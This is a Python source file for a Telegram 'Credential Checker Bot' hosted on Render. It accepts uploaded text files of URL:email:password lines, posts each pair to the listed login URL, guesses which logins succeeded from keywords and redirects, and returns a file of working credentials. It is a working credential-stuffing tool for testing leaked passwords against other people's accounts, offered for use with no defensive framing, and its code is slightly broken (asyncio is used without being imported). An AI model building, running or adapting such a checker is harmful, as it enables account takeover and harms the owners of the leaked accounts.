import os
import re
import threading
import time
import aiohttp
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ALLOWED_USER_ID = os.getenv("ALLOWED_USER_ID")
PORT = int(os.environ.get("PORT", 8080))

app = Flask(__name__)

# --- SECURITY CHECK ---
def is_allowed(user_id):
    if not ALLOWED_USER_ID:
        return True  # If no ID set, allow everyone (not recommended for production)
    return str(user_id) == str(ALLOWED_USER_ID)

# --- PARSING LOGIC ---
def parse_line(line):
    """
    Parses lines in formats like:
    https://site.com/login:email:password
    https://site.com:email:password
    site.com:email:password
    Returns (url, email, password) or None if invalid.
    """
    line = line.strip()
    if not line or line.startswith('#'):
        return None

    try:
        # We need to split by ':' but URLs contain ':' (http://).
        # Strategy: Find the last two colons. 
        # Everything after the last colon is the password.
        # Everything between the second-to-last and last colon is the username/email.
        # Everything before the second-to-last colon is the URL.
        
        colon_indices = [i for i, char in enumerate(line) if char == ':']
        
        if len(colon_indices) < 2:
            return None # Not enough parts for url:user:pass
            
        last_colon = colon_indices[-1]
        second_last_colon = colon_indices[-2]
        
        password = line[last_colon + 1:]
        username_email = line[second_last_colon + 1:last_colon]
        url_part = line[:second_last_colon]
        
        # Ensure URL has a scheme
        if not url_part.startswith('http://') and not url_part.startswith('https://'):
            url_part = 'https://' + url_part
            
        if not username_email or not password:
            return None
            
        return (url_part, username_email, password)
        
    except Exception:
        return None

# --- CHECKING LOGIC ---
async def check_single_credential(session, url, user, password):
    """
    Attempts to verify credentials by sending a POST request.
    Returns True if the response suggests a successful login, False otherwise.
    """
    try:
        # We attempt a POST request with common field names
        payload = {
            "email": user,
            "username": user,
            "user": user,
            "login": user,
            "password": password
        }
        
        # We do NOT follow redirects automatically. 
        # A redirect on a login attempt is often a sign of success (redirect to dashboard) 
        # or failure (redirect to login page with error). We must analyze the response.
        async with session.post(url, data=payload, allow_redirects=False, timeout=10) as response:
            status = response.status
            
            # If we get a redirect (301, 302, 303), it's ambiguous without knowing the target URL.
            # However, many simple login scripts redirect on success.
            # We will check the response text for success/failure indicators.
            
            text = ""
            try:
                text = (await response.text()).lower()
            except:
                pass
            
            # Indicators of FAILURE
            fail_terms = ["invalid", "incorrect", "failed", "error", "wrong", "unauthorized", "forbidden", "captcha", "verification"]
            # Indicators of SUCCESS
            success_terms = ["welcome", "dashboard", "success", "token", "session", "logout", "account", "profile", "home"]
            
            # Heuristic:
            # 1. If response contains explicit failure terms -> Invalid.
            # 2. If response contains explicit success terms -> Valid.
            # 3. If status is 302/303 and NO failure terms -> Likely Valid (Redirect to dashboard).
            # 4. If status is 200 and NO failure/success terms -> Likely Invalid (Stay on login page).
            
            has_fail = any(term in text for term in fail_terms)
            has_success = any(term in text for term in success_terms)
            
            if has_fail:
                return False
            
            if has_success:
                return True
                
            if status in [301, 302, 303]:
                # Redirect without failure terms is often a successful login redirect
                return True
            
            # Default to invalid if unsure
            return False

    except Exception:
        # Network errors, timeouts, etc. are treated as invalid/uncheckable
        return False

async def process_file_task(chat_id, file_path, context):
    valid_results = []
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text="❌ Error reading file. Make sure it's a valid text file.")
        if os.path.exists(file_path):
            os.remove(file_path)
        return

    total_lines = len(lines)
    await context.bot.send_message(
        chat_id=chat_id, 
        text=f"⚙️ Received {total_lines} lines.\nStarting validation process...\n\n⚠️ Note: This may take time depending on the number of valid-looking entries. I will send a file with results when done."
    )

    connector = aiohttp.TCPConnector(limit=20) # Limit concurrency to avoid being blocked or crashing
    async with aiohttp.ClientSession(connector=connector) as session:
        count = 0
        valid_count = 0
        
        for line in lines:
            parsed = parse_line(line)
            if parsed:
                url, user, passw = parsed
                is_valid = await check_single_credential(session, url, user, passw)
                if is_valid:
                    valid_results.append(f"{url}:{user}:{passw}")
                    valid_count += 1
            
            count += 1
            # Report progress every 10 lines or if it's the last line
            if count % 10 == 0 or count == total_lines:
                # Avoid spamming, but give some feedback if the file is huge
                if total_lines > 100 and count % 100 == 0:
                     await context.bot.send_message(chat_id=chat_id, text=f"⏳ Progress: {count}/{total_lines} lines processed.")
                elif total_lines <= 100:
                     # For small files, don't report progress, just do it
                     pass

    # Send results
    if valid_results:
        filename = "valid_credentials.txt"
        with open(filename, 'w') as f:
            f.write("\n".join(valid_results))
        
        await context.bot.send_document(
            chat_id=chat_id,
            document=open(filename, 'rb'),
            caption=f"✅ Process Complete.\nChecked: {count}\nValid Found: {valid_count}\n\nDownload the file below."
        )
        os.remove(filename)
    else:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"🛑 Process Complete.\nChecked: {count}\nValid Found: 0\n\nNo valid credentials were found."
        )

    # Clean up input file
    if os.path.exists(file_path):
        os.remove(file_path)

# --- TELEGRAM HANDLERS ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.message.from_user.id):
        return # Ignore unauthorized users silently
    
    await update.message.reply_text(
        "👨‍💻 **Credential Checker Bot**\n\n"
        "I can check a list of credentials (URL:email:password) and tell you which ones are valid.\n\n"
        "**How to use:**\n1. Create a `.txt` file with your list.\n2. Format: `https://site.com/login:email:password` (one per line).\n3. Send the file to me.\n\n"
        "I will process the file and send back a new file containing ONLY the valid credentials.\n\n"
        "⚠️ **Warning:** \n- This runs on a free server. Large files may be slow.\n- Some sites with CAPTCHA/2FA cannot be checked.\n- Use at your own risk."
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.message.from_user.id):
        return

    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file only.")
        return

    file = await context.bot.get_file(document.file_id)
    file_path = "input_credentials.txt"
    
    try:
        await file.download_to_drive(file_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download file: {str(e)}")
        return

    await update.message.reply_text("📥 File received. Starting validation...")
    
    # Start processing in the background so the bot doesn't timeout
    asyncio.create_task(process_file_task(update.message.chat_id, file_path, context))

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")

# --- FLASK SERVER (FOR RENDER HEALTH CHECK) ---
def run_flask():
    @app.route('/')
    def home():
        return "Bot is running and healthy.", 200
    
    # Run Flask on the port provided by the environment (Render) or default 8080
    app.run(host='0.0.0.0', port=PORT, threaded=True)

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    if not TOKEN:
        print("CRITICAL ERROR: TELEGRAM_BOT_TOKEN is not set in environment variables.")
        # Even without a token, we start the Flask server so Render doesn't think the app is broken
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        while True:
            time.sleep(60) # Keep alive but do nothing
        exit(1)

    # Start Flask in a separate daemon thread to satisfy Render's requirement for a web server
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    print("🚀 Starting Telegram Bot...")
    # Start the Telegram Bot in the main thread
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT, start_command)) # Treat any text as help
    
    # Run polling
    application.run_polling(allowed_updates=Update.ALL_TYPES)
